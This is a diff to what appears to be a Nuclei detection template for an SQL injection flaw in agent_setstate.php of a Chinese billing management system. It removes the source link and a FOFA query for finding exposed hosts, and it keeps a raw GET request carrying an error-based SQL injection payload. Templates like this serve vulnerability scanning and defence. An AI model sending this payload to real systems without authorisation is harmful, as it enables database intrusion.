@@ -3,14 +3,8 @@ info:
   name: 蓝海卓越计费管理系统 agent_setstate.php SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sur5voet2l7p92ew
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: sur5voet2l7p92ew
-    fofa: title=="蓝海卓越计费管理系统"
 http:
 - raw:
   - 'GET /agent_setstate.php?id=(SELECT%202*(IF((SELECT%20*%20FROM%20(SELECT%20CONCAT(0x717a767071,(SELECT%20(ELT(6154=6154,1))),0x7170716a71,0x78))s),%208446744073709551610,%208446744073709551610))) HTTP/1.1
